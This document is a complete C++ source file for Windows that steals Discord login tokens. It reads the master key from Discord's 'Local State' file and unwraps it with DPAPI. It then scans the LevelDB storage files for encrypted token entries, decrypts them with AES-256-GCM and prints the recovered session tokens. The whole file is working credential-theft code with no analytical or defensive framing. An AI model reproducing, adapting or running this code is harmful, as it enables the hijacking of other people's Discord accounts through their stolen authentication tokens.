#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <set>
#include <regex>
#include <filesystem>
#include <windows.h>
#include <wincrypt.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include "json.hpp"  // nlohmann/json 
#pragma comment(lib, "crypt32.lib")

namespace fs = std::filesystem;
using json = nlohmann::json;
using std::string;


string getEnv(const char* n) {
    char* v = nullptr;
    size_t s = 0;
    _dupenv_s(&v, &s, n);
    string r = v ? v : "";
    free(v);
    return r;
}

// --- Base64 decoding ---
static const string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

inline bool is_base64(unsigned char c) {
    return (isalnum(c) || (c == '+') || (c == '/'));
}

std::vector<unsigned char> base64_decode(const string& encoded_string) {
    std::vector<unsigned char> ret;
    int in_len = (int)encoded_string.size();
    int i = 0, j = 0;
    unsigned char char_array_4[4], char_array_3[3];

    while (in_len-- && (encoded_string[i] != '=') && is_base64((unsigned char)encoded_string[i])) {
        char_array_4[j++] = encoded_string[i++];
        if (j == 4) {
            for (j = 0; j < 4; j++)
                char_array_4[j] = (unsigned char)base64_chars.find(char_array_4[j]);
            char_array_3[0] = (unsigned char)((char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4));
            char_array_3[1] = (unsigned char)(((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2));
            char_array_3[2] = (unsigned char)(((char_array_4[2] & 0x3) << 6) + char_array_4[3]);
            ret.insert(ret.end(), char_array_3, char_array_3 + 3);
            j = 0;
        }
    }
    if (j) {
        for (int k = j; k < 4; k++)
            char_array_4[k] = 0;
        for (int k = 0; k < 4; k++)
            char_array_4[k] = (unsigned char)base64_chars.find(char_array_4[k]);
        char_array_3[0] = (unsigned char)((char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4));
        char_array_3[1] = (unsigned char)(((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2));
        char_array_3[2] = (unsigned char)(((char_array_4[2] & 0x3) << 6) + char_array_4[3]);
        for (int k = 0; k < j - 1; k++) ret.push_back(char_array_3[k]);
    }
    return ret;
}


string readFile(const fs::path& filePath) {
    std::ifstream in(filePath, std::ios::in | std::ios::binary);
    if (!in) return "";
    std::ostringstream contents;
    contents << in.rdbuf();
    return contents.str();
}


std::vector<unsigned char> dpapi_decrypt(const std::vector<unsigned char>& encryptedData) {
    DATA_BLOB inBlob, outBlob;
    inBlob.pbData = const_cast<BYTE*>(encryptedData.data());
    inBlob.cbData = (DWORD)encryptedData.size();

    if (!CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
        std::cerr << "CryptUnprotectData failed: " << GetLastError() << std::endl;
        return {};
    }

    std::vector<unsigned char> decrypted(outBlob.pbData, outBlob.pbData + outBlob.cbData);
    LocalFree(outBlob.pbData);
    return decrypted;
}


bool aes_gcm_decrypt(const std::vector<unsigned char>& ciphertext,
    const std::vector<unsigned char>& key,
    const std::vector<unsigned char>& iv,
    const std::vector<unsigned char>& tag,
    std::vector<unsigned char>& plaintext)
{
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        std::cerr << "Failed to create EVP_CIPHER_CTX" << std::endl;
        return false;
    }

    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL)) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, (int)iv.size(), NULL)) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    if (1 != EVP_DecryptInit_ex(ctx, NULL, NULL, key.data(), iv.data())) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    plaintext.resize(ciphertext.size());
    int out_len = 0;
    if (1 != EVP_DecryptUpdate(ctx, plaintext.data(), &out_len, ciphertext.data(), (int)ciphertext.size())) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    int plaintext_len = out_len;

    // Set expected tag value.
    if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, (int)tag.size(), (void*)tag.data())) {
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    // Finalize decryption.
    int ret = EVP_DecryptFinal_ex(ctx, plaintext.data() + out_len, &out_len);
    EVP_CIPHER_CTX_free(ctx);
    if (ret > 0) {
        plaintext_len += out_len;
        plaintext.resize(plaintext_len);
        return true;
    }
    else {
        std::cerr << "Decryption failed" << std::endl;
        return false;
    }
}


std::vector<std::string> getTokens(const fs::path& leveldbPath) {
    std::vector<std::string> tokens;
    if (!fs::exists(leveldbPath)) {
        return tokens;
    }


    std::regex token_regex(R"(dQw4w9WgXcQ:([^\s\"']+))");
    for (const auto& entry : fs::directory_iterator(leveldbPath)) {
        if (!entry.is_regular_file()) continue;
        string ext = entry.path().extension().string();
        if (ext != ".ldb" && ext != ".log")
            continue;
        string content = readFile(entry.path());
        std::smatch match;
        std::string::const_iterator searchStart(content.cbegin());
        while (std::regex_search(searchStart, content.cend(), match, token_regex)) {
            if (match.size() >= 2) {
                tokens.push_back(match[1].str());
            }
            searchStart = match.suffix().first;
        }
    }
    return tokens;
}


std::vector<unsigned char> getKey(const fs::path& localStatePath) {
    string localStateContent = readFile(localStatePath);
    if (localStateContent.empty()) {
        std::cerr << "Failed to read Local State file." << std::endl;
        return {};
    }

    json j;
    try {
        j = json::parse(localStateContent);
    }
    catch (json::parse_error& e) {
        std::cerr << "JSON parse error: " << e.what() << std::endl;
        return {};
    }

    string encrypted_key_b64 = j["os_crypt"]["encrypted_key"];
    auto encrypted_key_all = base64_decode(encrypted_key_b64);
    if (encrypted_key_all.size() <= 5) {
        std::cerr << "Invalid encrypted key size." << std::endl;
        return {};
    }
    // Remove the "DPAPI" prefix (first 5 bytes)
    std::vector<unsigned char> encrypted_key(encrypted_key_all.begin() + 5, encrypted_key_all.end());
    return dpapi_decrypt(encrypted_key);
}

int main() {

    string appdata = getEnv("APPDATA");
    if (appdata.empty()) {
        std::cerr << "APPDATA environment variable not found." << std::endl;
        return 1;
    }
    fs::path discordPath = fs::path(appdata) / "discord";
    if (!fs::exists(discordPath)) {
        std::cerr << "Discord folder not found in APPDATA." << std::endl;
        return 1;
    }


    fs::path localStatePath = discordPath / "Local State";
    auto key = getKey(localStatePath);
    if (key.empty()) {
        std::cerr << "Failed to obtain decryption key." << std::endl;
        return 1;
    }
    fs::path leveldbPath = discordPath / "Local Storage" / "leveldb";
    auto token_encodings = getTokens(leveldbPath);
    std::set<std::string> checked;

    for (const auto& token_enc : token_encodings) {

        string tokenStr = token_enc;
        if (!tokenStr.empty() && tokenStr.back() == '\\') {
            tokenStr.pop_back();
        }

        auto tokenData = base64_decode(tokenStr);
        if (tokenData.size() < 15 + 16) { // least IV + tag
            continue;
        }
        // Extract IV from bytes [3,15) (12 bytes)
        std::vector<unsigned char> iv(tokenData.begin() + 3, tokenData.begin() + 15);
        // The remainder from index 15 onward: last 16 bytes are tag.
        if (tokenData.size() <= 15 + 16) continue;
        std::vector<unsigned char> cipher_and_tag(tokenData.begin() + 15, tokenData.end());
        if (cipher_and_tag.size() < 16) continue;
        std::vector<unsigned char> tag(cipher_and_tag.end() - 16, cipher_and_tag.end());
        std::vector<unsigned char> ciphertext(cipher_and_tag.begin(), cipher_and_tag.end() - 16);

        std::vector<unsigned char> decrypted;
        if (!aes_gcm_decrypt(ciphertext, key, iv, tag, decrypted)) {
            std::cerr << "Failed to decrypt token." << std::endl;
            continue;
        }
        string token(decrypted.begin(), decrypted.end());

        if (checked.find(token) != checked.end())
            continue;
        checked.insert(token);
        std::cout << "Token: " << token << std::endl;
    }

    return 0;
}
